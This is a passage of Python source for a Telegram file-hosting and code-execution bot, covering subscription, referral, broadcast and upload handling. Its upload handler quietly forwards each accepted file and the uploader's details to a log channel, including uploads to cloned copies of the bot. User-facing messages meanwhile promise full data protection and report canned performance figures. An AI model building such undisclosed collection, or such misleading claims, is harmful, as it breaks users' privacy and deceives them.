        else:
            return {
                'username': 'Unknown',
                'first_name': 'Unknown',
                'last_name': 'Unknown'
            }
    except Exception as e:
        logger.error(f"Error getting user info: {e}")
        return {
            'username': 'Unknown',
            'first_name': 'Unknown',
            'last_name': 'Unknown'
        }

# --- Enhanced Periodic Systems ---
def periodic_backup():
    """Run periodic backups every 30 minutes"""
    while True:
        try:
            time.sleep(1800)  # 30 minutes

            create_backup()
            save_persistent_data()

            logger.info("✅ Periodic backup completed")

        except Exception as e:
            logger.error(f"❌ Error in periodic backup: {e}")

def persistent_data_saver():
    """Continuously save persistent data every 2 minutes"""
    while True:
        try:
            time.sleep(120)  # 2 minutes
            save_persistent_data()
        except Exception as e:
            logger.error(f"❌ Error in persistent data saver: {e}")

def start_background_tasks():
    """Start all background tasks"""
    backup_thread = threading.Thread(target=periodic_backup, daemon=True)
    backup_thread.start()

    persister_thread = threading.Thread(target=persistent_data_saver, daemon=True)
    persister_thread.start()

    logger.info("✅ Background tasks started")

# --- Broadcast to All Users Function ---
def broadcast_to_all_users(message_text, from_user_id):
    """Send broadcast message to ALL users who ever started the bot"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT user_id FROM active_users')
        all_users = [row[0] for row in c.fetchall()]
        conn.close()

        success_count = 0
        failed_count = 0

        broadcast_message = f"📢 BROADCAST MESSAGE\n\n{message_text}\n\n- From Bot DOX- Admin"

        for user_id in all_users:
            try:
                # Skip banned users
                if user_id in banned_users:
                    continue

                bot.send_message(user_id, broadcast_message)
                success_count += 1
                time.sleep(0.1)  # Rate limiting
            except Exception as e:
                failed_count += 1
                logger.error(f"Failed to send broadcast to {user_id}: {e}")

        return success_count, failed_count, len(all_users)

    except Exception as e:
        logger.error(f"Error in broadcast to all users: {e}")
        return 0, 0, 0

# --- Subscription Button Handler ---
@bot.message_handler(func=lambda message: message.text == "💳 Subscriptions")
def subscriptions_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Only admins can manage subscriptions!")
        return

    subs_text = "💳 SUBSCRIPTION MANAGEMENT\n\n"
    subs_text += "📊 Available Actions:\n"
    subs_text += "• Add subscription to users\n"
    subs_text += "• Remove subscription\n"
    subs_text += "• View subscribed users\n\n"
    subs_text += "📈 Statistics:\n"

    active_subs = 0
    expired_subs = 0
    for user_id_sub, sub_info in user_subscriptions.items():
        if sub_info['expiry'] > datetime.now():
            active_subs += 1
        else:
            expired_subs += 1

    subs_text += f"🟢 Active Subscriptions: {active_subs}\n"
    subs_text += f"🔴 Expired Subscriptions: {expired_subs}\n"
    subs_text += f"👥 Total Users: {len(active_users)}\n\n"
    subs_text += "⚡ Quick Actions:"

    markup = types.InlineKeyboardMarkup(row_width=2)

    markup.add(
        types.InlineKeyboardButton("➕ Add Subscription", callback_data="sub_add"),
        types.InlineKeyboardButton("➖ Remove Subscription", callback_data="sub_remove")
    )
    markup.add(
        types.InlineKeyboardButton("📊 Subscribed Users", callback_data="sub_active"),
        types.InlineKeyboardButton("🔙 Back", callback_data="sub_back")
    )

    safe_reply_to(message, subs_text, reply_markup=markup)

# --- Subscription Callback Handlers ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('sub_'))
def handle_subscription_actions(call):
    """Handle all subscription related actions"""
    try:
        user_id = call.from_user.id
        if user_id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Only admins can manage subscriptions!")
            return

        action = call.data
        chat_id = call.message.chat.id
        message_id = call.message.message_id

        if action == "sub_add":
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(
                types.InlineKeyboardButton("➕ 7 Days", callback_data="sub_add_7"),
                types.InlineKeyboardButton("➕ 30 Days", callback_data="sub_add_30"),
                types.InlineKeyboardButton("➕ 90 Days", callback_data="sub_add_90"),
                types.InlineKeyboardButton("➕ 365 Days", callback_data="sub_add_365"),
                types.InlineKeyboardButton("🔙 Back", callback_data="sub_back")
            )
            bot.edit_message_text(
                "➕ ADD SUBSCRIPTION\n\nSelect subscription duration:",
                chat_id, message_id, reply_markup=markup
            )
            bot.answer_callback_query(call.id)

        elif action == "sub_remove":
            remove_text = "➖ REMOVE SUBSCRIPTION\n\n"
            remove_text += "Please send the user ID to remove subscription from:\n"
            remove_text += "Format: /remove_userid\nExample: /remove_123456789\n\n"
            remove_text += "Available users with subscriptions:\n"

            has_subs = False
            for target_user_id, sub_info in user_subscriptions.items():
                if sub_info['expiry'] > datetime.now():
                    remove_text += f"🆔 {target_user_id} (Expires: {sub_info['expiry'].strftime('%Y-%m-%d')})\n"
                    has_subs = True

            if not has_subs:
                remove_text += "📭 No active subscriptions found."

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="sub_back"))

            bot.edit_message_text(remove_text, chat_id, message_id, reply_markup=markup)

            # Register next step handler
            bot.register_next_step_handler_by_chat_id(
                chat_id,
                lambda msg: handle_remove_subscription_step(msg)
            )
            bot.answer_callback_query(call.id)

        elif action.startswith("sub_add_"):
            # Store duration for next step
            days = int(action.split("_")[2])
            bot.register_next_step_handler_by_chat_id(
                chat_id,
                lambda msg: handle_add_subscription_step(msg, days)
            )
            bot.edit_message_text(
                f"➕ ADD {days} DAYS SUBSCRIPTION\n\n"
                f"Please send the user ID to add subscription to:\n"
                f"Format: @username or user_id",
                chat_id, message_id
            )
            bot.answer_callback_query(call.id)

        elif action == "sub_active":
            active_text = "📊 SUBSCRIBED USERS\n\n"

            has_active = False
            current_time = datetime.now()

            for target_user_id, sub_info in user_subscriptions.items():
                if sub_info['expiry'] > current_time:
                    days_left = (sub_info['expiry'] - current_time).days

                    # केवल ID और subscription details दिखाएं
                    active_text += f"🆔 ID: {target_user_id}\n"
                    active_text += f"📅 Expiry: {sub_info['expiry'].strftime('%Y-%m-%d')}\n"
                    active_text += f"⏰ Days Left: {days_left} days\n\n"

                    has_active = True

            if not has_active:
                active_text += "📭 No active subscriptions found."

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="sub_back"))

            bot.edit_message_text(active_text, chat_id, message_id, reply_markup=markup)
            bot.answer_callback_query(call.id)

        elif action == "sub_back":
            # Return to main subscription menu
            subscriptions_button(call.message)
            bot.answer_callback_query(call.id)

    except Exception as e:
        logger.error(f"Error in subscription action: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

def handle_add_subscription_step(message, days):
    """Handle adding subscription after user ID is provided"""
    try:
        user_input = message.text.strip()
        target_user_id = None

        # Try to parse user ID from input
        if user_input.startswith('@'):
            # Username provided, need to get user ID
            username = user_input[1:]
            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT user_id FROM active_users WHERE username = ?', (username,))
                result = c.fetchone()
                conn.close()
                if result:
                    target_user_id = result[0]
                else:
                    bot.send_message(message.chat.id, f"❌ User @{username} not found in database!")
                    return
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Database error: {str(e)}")
                return
        else:
            try:
                target_user_id = int(user_input)
            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid user ID format!")
                return

        if not target_user_id:
            bot.send_message(message.chat.id, "❌ Could not determine user ID!")
            return

        # Add subscription
        expiry_date = datetime.now() + timedelta(days=days)
        user_subscriptions[target_user_id] = {'expiry': expiry_date}

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)',
                     (target_user_id, expiry_date.isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving subscription: {e}")

        # Update persistent data
        save_persistent_data()

        # Get user info for logging
        user_info = get_user_info(target_user_id)

        success_msg = f"✅ SUBSCRIPTION ADDED SUCCESSFULLY!\n\n"
        success_msg += f"🆔 User ID: {target_user_id}\n"
        success_msg += f"📅 Days: {days}\n"
        success_msg += f"⏰ Expiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
        success_msg += f"👤 Added by: {message.from_user.first_name}"

        bot.send_message(message.chat.id, success_msg)

        # Send notification to user
        try:
            user_notification = f"🎉 SUBSCRIPTION ACTIVATED!\n\n"
            user_notification += f"✅ Your subscription has been activated!\n"
            user_notification += f"📅 Duration: {days} days\n"
            user_notification += f"⏰ Expiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
            user_notification += f"📁 New file limit: {SUBSCRIBED_USER_LIMIT} files\n\n"
            user_notification += f"Thank you for subscribing! 🎊"

            bot.send_message(target_user_id, user_notification)
        except:
            pass

        # Log to channel
        log_msg = f"💳 SUBSCRIPTION ADDED\n\n"
        log_msg += f"🆔 User ID: {target_user_id}\n"
        log_msg += f"📅 Days: {days}\n"
        log_msg += f"⏰ Expiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
        log_msg += f"👑 Added by: {message.from_user.id} ({message.from_user.first_name})"

        send_to_log_channel(log_msg)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error adding subscription: {str(e)}")

def handle_remove_subscription_step(message):
    """Handle remove subscription after user ID is provided"""
    try:
        text = message.text.strip()

        if not text.startswith('/remove_'):
            bot.send_message(message.chat.id, "❌ Invalid format! Use: /remove_123456789")
            return

        try:
            target_user_id = int(text.replace('/remove_', ''))
        except ValueError:
            bot.send_message(message.chat.id, "❌ Invalid user ID!")
            return

        if target_user_id in user_subscriptions:
            # Remove subscription
            del user_subscriptions[target_user_id]

            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM subscriptions WHERE user_id = ?', (target_user_id,))
                conn.commit()
                conn.close()
            except Exception as e:
                logger.error(f"Database error removing subscription: {e}")

            # Update persistent data
            save_persistent_data()

            success_msg = f"✅ SUBSCRIPTION REMOVED SUCCESSFULLY!\n\n"
            success_msg += f"🆔 User ID: {target_user_id}\n"
            success_msg += f"👤 Removed by: {message.from_user.first_name}"

            bot.send_message(message.chat.id, success_msg)

            # Send notification to user
            try:
                user_notification = f"📢 SUBSCRIPTION REMOVED\n\n"
                user_notification += f"⚠️ Your subscription has been removed by admin.\n"
                user_notification += f"📁 File limit is now: {FREE_USER_LIMIT} files\n\n"
                user_notification += f"Contact admin for more information."

                bot.send_message(target_user_id, user_notification)
            except:
                pass

            # Log to channel
            log_msg = f"🗑️ SUBSCRIPTION REMOVED\n\n"
            log_msg += f"🆔 User ID: {target_user_id}\n"
            log_msg += f"👑 Removed by: {message.from_user.id} ({message.from_user.first_name})"

            send_to_log_channel(log_msg)
        else:
            bot.send_message(message.chat.id, f"❌ User {target_user_id} doesn't have an active subscription!")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error removing subscription: {str(e)}")

# --- NEW: Referral System Button Handler ---
@bot.message_handler(func=lambda message: message.text == "👥 Referral System")
def referral_system_button(message):
    """Show referral system information"""
    user_id = message.from_user.id

    if user_id in banned_users:
        safe_reply_to(message, "🚫 You are banned from using this bot.")
        return

    referral_info = get_referral_info(user_id)

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 My Referrals", callback_data="ref_my_stats"),
        types.InlineKeyboardButton("🔗 Get Link", callback_data="ref_get_link"),
        types.InlineKeyboardButton("📁 Check Limit", callback_data="ref_check_limit"),
        types.InlineKeyboardButton("❓ How It Works", callback_data="ref_howto")
    )

    safe_reply_to(message, referral_info, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('ref_'))
def handle_referral_actions(call):
    """Handle referral system actions"""
    try:
        user_id = call.from_user.id
        action = call.data
        chat_id = call.message.chat.id
        message_id = call.message.message_id

        if action == "ref_my_stats":
            # Show detailed stats
            stats = referral_stats.get(user_id, {'total': 0, 'successful': 0, 'slots_earned': 0})
            referrals = user_referrals.get(user_id, [])

            stats_text = f"📊 **Detaylı Referans İstatistikleriniz**\n\n"
            stats_text += f"👥 **Toplam Referans:** {stats['total']}\n"
            stats_text += f"✅ **Başarılı Referans:** {stats['successful']}\n"
            stats_text += f"🎁 **Kazanılan Slot:** {stats['slots_earned']}\n"
            stats_text += f"📁 **Mevcut Limit:** {get_user_file_limit(user_id)}\n\n"

            if referrals:
                stats_text += "**Referans Ettiğiniz Kullanıcılar:**\n"
                for i, ref_id in enumerate(referrals[-10:], 1):  # Show last 10
                    stats_text += f"{i}. {ref_id}\n"

            bot.edit_message_text(stats_text, chat_id, message_id, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif action == "ref_get_link":
            # Show referral link
            code = generate_referral_code(user_id)
            bot_username = bot.get_me().username

            link_text = f"🔗 **Referans Linkiniz**\n\n"
            link_text += f"📤 **Link:**\n`https://t.me/{bot_username}?start=ref_{code}`\n\n"
            link_text += f"🔑 **Referans Kodunuz:** `{code}`\n\n"
            link_text += f"📋 **Kullanım:**\n"
            link_text += f"1. Linki arkadaşlarınızla paylaşın\n"
            link_text += f"2. Botu başlattıklarında otomatik referans sayılır\n"
            link_text += f"3. Her {REFERRALS_PER_SLOT} referansta 1 slot kazanın!\n\n"
            link_text += f"🎯 **Maksimum Kazanç:** {MAX_REFERRAL_SLOTS} slot"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="ref_back"))

            bot.edit_message_text(link_text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif action == "ref_check_limit":
            # Show current limit breakdown
            base = FREE_USER_LIMIT
            referral_slots = get_referral_slots_earned(user_id)
            total = get_user_file_limit(user_id)
            current_files = get_user_file_count(user_id)

            limit_text = f"📁 **Dosya Limit Durumunuz**\n\n"
            limit_text += f"📊 **Limit Detayı:**\n"
            limit_text += f"• Temel Limit: {base} dosya\n"
            limit_text += f"• Referans Slotları: +{referral_slots} dosya\n"
            limit_text += f"• Toplam Limit: {total} dosya\n\n"
            limit_text += f"📈 **Kullanım:**\n"
            limit_text += f"• Yüklenen Dosya: {current_files}\n"
            limit_text += f"• Kalan Slot: {total - current_files}\n\n"

            if user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now():
                limit_text += f"💎 **Premium Aktif!**\n"
                limit_text += f"• Premium Limit: {SUBSCRIBED_USER_LIMIT} dosya\n"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="ref_back"))

            bot.edit_message_text(limit_text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif action == "ref_howto":
            # Show how it works
            howto_text = f"❓ **Referans Sistemi Nasıl Çalışır?**\n\n"
            howto_text += f"**📌 Adım 1:** Referans linkinizi alın\n"
            howto_text += f"**📌 Adım 2:** Linki arkadaşlarınızla paylaşın\n"
            howto_text += f"**📌 Adım 3:** Botu başlattıklarında otomatik referans sayılır\n"
            howto_text += f"**📌 Adım 4:** Her {REFERRALS_PER_SLOT} referansta 1 ekstra dosya yükleme slotu kazanın!\n\n"
            howto_text += f"**🎁 Kazanç:**\n"
            howto_text += f"• {REFERRALS_PER_SLOT} referans = 1 ekstra slot\n"
            howto_text += f"• Maksimum {MAX_REFERRAL_SLOTS} ekstra slot\n"
            howto_text += f"• Toplam limit: {FREE_USER_LIMIT} (temel) + kazandığınız slotlar\n\n"
            howto_text += f"**⚠️ Not:**\n"
            howto_text += f"• Kendi kendinize referans veremezsiniz\n"
            howto_text += f"• Her kullanıcı sadece bir kez referans sayılır\n"
            howto_text += f"• Botu daha önce başlatanlar referans sayılmaz\n"

            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="ref_back"))

            bot.edit_message_text(howto_text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

        elif action == "ref_back":
            # Return to main referral menu
            referral_info = get_referral_info(user_id)

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("📊 My Referrals", callback_data="ref_my_stats"),
                types.InlineKeyboardButton("🔗 Get Link", callback_data="ref_get_link"),
                types.InlineKeyboardButton("📁 Check Limit", callback_data="ref_check_limit"),
                types.InlineKeyboardButton("❓ How It Works", callback_data="ref_howto")
            )

            bot.edit_message_text(referral_info, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
            bot.answer_callback_query(call.id)

    except Exception as e:
        logger.error(f"Error in referral action: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Command Handlers ---
@bot.message_handler(commands=['start'])
def start_command(message):
    """Enhanced start command with referral system"""
    user_id = message.from_user.id

    if user_id in banned_users:
        safe_reply_to(message, "🚫 You are banned from using this bot.\n\nIf you believe this is a mistake, contact @doxbinyetkili")
        return

    # Check for referral code
    args = message.text.split()
    if len(args) > 1 and args[1].startswith('ref_'):
        referral_code = args[1][4:]  # Remove 'ref_' prefix

        # Process referral
        success, result = process_referral(user_id, referral_code)
        if success:
            safe_send_message(message.chat.id, f"✅ {result}")
        else:
            safe_send_message(message.chat.id, f"ℹ️ {result}")

    active_users.add(user_id)

    user_info = message.from_user
    save_user_info(user_id, user_info.username, user_info.first_name, user_info.last_name)

    user_name = message.from_user.first_name or "User"
    is_admin = user_id in admin_ids

    welcome_msg = f"🔐 UNIVERSAL FILE HOST\n\n"
    welcome_msg += f"👋 Welcome {user_name}!\n\n"
    welcome_msg += f"📁 SUPPORTED FILE TYPES:\n"
    welcome_msg += f"🚀 Executable: Python, JavaScript, Java, C/C++, Go, Rust, PHP, Shell, Ruby, TypeScript, Lua, Perl, Scala, R\n\n"
    welcome_msg += f"📄 Hosted: HTML, CSS, XML, JSON, YAML, Markdown, Text, Images, PDFs, Archives\n\n"
    welcome_msg += f"🔐 FEATURES:\n"
    welcome_msg += f"✅ Universal file hosting (30+ types)\n"
    welcome_msg += f"🚀 Multi-language code execution\n"
    welcome_msg += f"🛡️ Advanced security scanning\n"
    welcome_msg += f"✅ Owner approval system for blocked files\n"
    welcome_msg += f"✅ Owner approval required for ALL file execution\n"
    welcome_msg += f"🌐 Real-time monitoring\n"
    welcome_msg += f"📊 Process management\n"
    welcome_msg += f"⚡ Auto dependency installation\n"
    welcome_msg += f"👥 Referral system: {REFERRALS_PER_SLOT} referrals = 1 extra slot\n\n"
    welcome_msg += f"🛡️ **100% DATA PROTECTION**\n"
    welcome_msg += f"✅ Auto-restart on bot reboot\n"
    welcome_msg += f"✅ Never lose your files\n"
    welcome_msg += f"✅ Permanent storage\n\n"
    welcome_msg += f"📊 YOUR STATUS:\n"
    welcome_msg += f"📁 Upload Limit: {get_user_file_limit(user_id)} files\n"
    welcome_msg += f"📄 Current Files: {get_user_file_count(user_id)} files\n"
    welcome_msg += f"👤 Account Type: {'👑 Owner (No Restrictions)' if user_id == OWNER_ID else '👑 Admin' if is_admin else '👤 User'}\n"
    if user_id == OWNER_ID:
        welcome_msg += f"🔓 Security: Bypassed for Owner\n"
    welcome_msg += f"\n"
    welcome_msg += f"💡 Quick Start: Upload any file to begin!\n"
    welcome_msg += f"🤖 Clone Feature: Use 'Clone Bot' button to create your own bot!\n"
    welcome_msg += f"✅ File Blocked? It will be sent to owner for approval!\n"
    welcome_msg += f"⚡ File Execution? Owner approval required for ALL executions!"

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    if is_admin:
        for row in ADMIN_COMMAND_BUTTONS_LAYOUT_USER_SPEC:
            markup.add(*[types.KeyboardButton(text) for text in row])
    else:
        for row in COMMAND_BUTTONS_LAYOUT_USER_SPEC:
            markup.add(*[types.KeyboardButton(text) for text in row])

    safe_send_message(message.chat.id, welcome_msg, reply_markup=markup)

    send_to_log_channel(f"🟢 USER STARTED BOT\n\nUser: {user_name}\nID: {user_id}\nUsername: @{user_info.username or 'None'}")

    # Update persistent data
    save_persistent_data()

# --- MODIFIED File Upload Handler - Owner approval for ALL executable files ---
@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
    """Enhanced file upload handler with owner approval system for all executable files"""
    user_id = message.from_user.id

    if bot_locked and user_id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Please try again later.")
        return

    current_count = get_user_file_count(user_id)
    max_allowed = get_user_file_limit(user_id)

    if current_count >= max_allowed:
        safe_reply_to(message, f"❌ File limit reached! You can upload maximum {max_allowed} files.")
        return

    file_info = bot.get_file(message.document.file_id)
    file_name = message.document.file_name or f"file_{int(time.time())}"
    file_ext = os.path.splitext(file_name)[1].lower()

    if message.document.file_size > 10 * 1024 * 1024:
        safe_reply_to(message, "❌ File too large! Maximum size is 10MB for security reasons.")
        return

    try:
        processing_msg = safe_reply_to(message, f"🔍 Security scanning {file_name}...")

        if file_info.file_path is None:
            safe_reply_to(message, "❌ File Download Failed\n\nUnable to retrieve file path")
            return
        downloaded_file = bot.download_file(file_info.file_path)

        user_folder = get_user_folder(user_id)
        temp_file_path = os.path.join(user_folder, f"temp_{file_name}")

        with open(temp_file_path, 'wb') as f:
            f.write(downloaded_file)

        if user_id == OWNER_ID:
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id,
                             f"👑 Owner bypass: {file_name} - No security restrictions")
            is_safe = True
            scan_result = "Owner bypass - all files allowed"
            detected_threats = []
        else:
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id,
                             f"🛡️ Security scan: {file_name}...")

            is_safe, scan_result, detected_threats = check_malicious_code(temp_file_path)

            if not is_safe:
                # Send for approval if security issues detected
                user_info = get_user_info(user_id)

                safe_edit_message(processing_msg.chat.id, processing_msg.message_id,
                                 f"🛡️ Security issues detected in {file_name}...\n\nSending for owner approval...")

                # Send approval request to owner
                approval_id = send_approval_request_to_owner(
                    user_id, file_name, temp_file_path, scan_result, user_info
                )

                if approval_id:
                    user_msg = f"🔄 FILE SENT FOR APPROVAL\n\n"
                    user_msg += f"📄 File: {file_name}\n"
                    user_msg += f"🔍 Issue: {scan_result}\n"
                    user_msg += f"⏰ Status: Sent to owner for review\n\n"
                    user_msg += f"✅ The file owner (@doxbinyetkili) will review your file.\n"
                    user_msg += f"📩 You will be notified when it's approved or rejected.\n"
                    user_msg += f"⏳ Please wait for the review process."

                    safe_edit_message(processing_msg.chat.id, processing_msg.message_id, user_msg)
                else:
                    safe_edit_message(processing_msg.chat.id, processing_msg.message_id,
                                     "❌ Error sending for approval. Please try again.")
                    try:
                        os.remove(temp_file_path)
                    except:
                        pass

                return

        # If safe or owner, determine file type
        file_path = os.path.join(user_folder, file_name)
        try:
            shutil.move(temp_file_path, file_path)
        except:
            os.rename(temp_file_path, file_path)

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id,
                         f"✅ Security check passed - Processing {file_name}...")

        if user_id not in user_files:
            user_files[user_id] = []

        file_type = 'executable' if file_ext in {'.py', '.js', '.java', '.cpp', '.c', '.sh', '.rb', '.go', '.rs', '.php', '.cs', '.kt', '.swift', '.dart', '.ts', '.lua', '.perl', '.scala', '.r', '.bat', '.ps1'} else 'hosted'

        user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]
        user_files[user_id].append((file_name, file_type))

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO user_files (user_id, file_name, file_type, upload_time) VALUES (?, ?, ?, ?)',
                     (user_id, file_name, file_type, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving file info: {e}")

        # Update persistent data
        save_persistent_data()

        # Log file upload to channel WITH THE ACTUAL FILE
        log_file_upload(user_id, file_name, file_type, message.document.file_size, "✅ PASSED", file_path)

        # Enhanced logging for cloned bots
        is_cloned_bot = bot.get_me().username != "CyberHacked0Bot"  # Check if this is not the main bot

        if is_cloned_bot:
            try:
                clone_log_msg = f"🤖 FILE FROM CLONED BOT\n\n"
                clone_log_msg += f"👤 User: {message.from_user.first_name or 'Unknown'} {message.from_user.last_name or ''}\n"
                clone_log_msg += f"🆔 User ID: {user_id}\n"
                clone_log_msg += f"📧 Username: @{message.from_user.username or 'None'}\n"
                clone_log_msg += f"📄 File: {file_name}\n"
                clone_log_msg += f"📁 Type: {file_type}\n"
                clone_log_msg += f"🤖 Bot: @{bot.get_me().username}\n"
                clone_log_msg += f"👑 Clone Owner: {OWNER_ID}\n"
                clone_log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

                with open(file_path, 'rb') as f:
                    send_to_log_channel(clone_log_msg, f)

                logger.info(f"File {file_name} logged from cloned bot")
            except Exception as e:
                logger.error(f"Failed to log file from cloned bot: {e}")

        # SIMPLE SUCCESS MESSAGE WITHOUT INLINE BUTTONS
        if file_type == 'executable':
            success_msg = f"✅ {file_name} uploaded successfully!\n\n"
            success_msg += f"📁 Type: {file_type}\n"
            success_msg += f"✅ Status: Ready for execution\n\n"
            success_msg += f"⚠️ **IMPORTANT:** To execute this file, you need owner approval.\n"
            success_msg += f"📩 When you click 'Start', the file will be sent to owner for approval.\n\n"
            success_msg += f"📂 Use 'Check Files' to manage and request execution."
        else:
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')

            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                test_response = requests.get(f"{replit_url}/health", timeout=5)
                if test_response.status_code != 200:
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                replit_url = f"https://{domain}-{owner}.replit.app"

            file_url = f"{replit_url}/file/{file_hash}"

            success_msg = f"✅ {file_name} hosted successfully!\n\n"
            success_msg += f"📄 File: {file_name}\n"
            success_msg += f"📁 Type: {file_type}\n"
            success_msg += f"🔗 URL: {file_url}\n"
            success_msg += f"🛡️ Security: Maximum protection\n\n"
            success_msg += f"📂 Use 'Check Files' to manage your files."

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)

    except Exception as e:
        logger.error(f"File upload error: {e}")
        safe_reply_to(message, f"❌ Upload Failed\n\nError processing file: {str(e)}")

        try:
            temp_file_path = os.path.join(get_user_folder(user_id), f"temp_{file_name}")
            if os.path.exists(temp_file_path):
                os.remove(temp_file_path)
        except:
            pass

# --- Button Handlers ---
@bot.message_handler(func=lambda message: message.text == "📤 Upload File")
def upload_file_button(message):
    if bot_locked and message.from_user.id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Access denied.")
        return
    safe_reply_to(message, "🔒 Universal File Upload\n\n📁 Send me any file to upload!\n\n🌟 Supported: 30+ file types\n💻 Executable: Python, JS, Java, C/C++, Go, Rust, PHP, etc.\n📄 Hosted: Documents, Images, Videos, Archives\n\n🛡️ All uploads are secure and permanent!\n\n⚠️ Executable files require owner approval to run.")

# --- MODIFIED Check Files with note about execution approval ---
@bot.message_handler(func=lambda message: message.text == "📂 Check Files")
def check_files_button(message):
    if bot_locked and message.from_user.id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Access denied.")
        return

    user_id = message.from_user.id
    files = user_files.get(user_id, [])

    if not files:
        safe_reply_to(message, "📂 Your Files\n\n🔒 No files uploaded yet.\n\n💡 Upload any file type to begin!")
        return

    files_text = "🔒 Your Files:\n\n📁 Click on any file to manage it:\n\n"
    files_text += "⚠️ **Note:** Executable files require owner approval to run.\n\n"

    markup = types.InlineKeyboardMarkup(row_width=1)

    for i, (file_name, file_type) in enumerate(files, 1):
        if file_type == 'executable':
            is_running = is_bot_running(user_id, file_name)
            status = "🟢 Running" if is_running else "⭕ Stopped"
            icon = "🚀"

            if is_running:
                uptime = get_script_uptime(user_id, file_name)
                if uptime:
                    status += f" (Uptime: {uptime})"

            files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n\n"
        else:
            status = "📁 Hosted"
            icon = "📄"
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')

            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                test_response = requests.get(f"{replit_url}/health", timeout=2)
                if test_response.status_code != 200:
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                replit_url = f"https://{domain}-{owner}.replit.app"

            file_url = f"{replit_url}/file/{file_hash}"
            files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n   🔗 Access: {file_url}\n\n"

        markup.add(types.InlineKeyboardButton(
            f"{icon} {file_name} - {status}",
            callback_data=f'control_{user_id}_{file_name}'
        ))

    files_text += "⚙️ Management Options:\n• 🟢 Request Execution (owner approval required)\n• 🔴 Stop running files\n• 🗑️ Delete files\n• 📜 View execution logs\n• 🔄 Restart running files"

    safe_reply_to(message, files_text, reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "⚡ Bot Speed")
def bot_speed_button(message):
    start_time = time.time()
    msg = safe_reply_to(message, "🏃 Testing speed...")
    response_time = round((time.time() - start_time) * 1000, 2)

    speed_text = f"⚡ Universal File Host Performance:\n\n"
    speed_text += f"🚀 Response Time: {response_time}ms\n"
    speed_text += f"🔧 CPU Usage: Optimized\n"
    speed_text += f"💾 Memory: Efficient\n"
    speed_text += f"🌐 Network: High Speed\n"
    speed_text += f"🛡️ Security: Maximum\n"
    speed_text += f"📊 Files Supported: 30+ types\n"
    speed_text += f"💾 Data Protection: 100% ACTIVE\n\n"
    speed_text += f"✅ All systems operational!"

    safe_edit_message(msg.chat.id, msg.message_id, speed_text)

# --- Statistics Button ---
@bot.message_handler(func=lambda message: message.text == "📊 Statistics")
def statistics_button(message):
    user_id = message.from_user.id

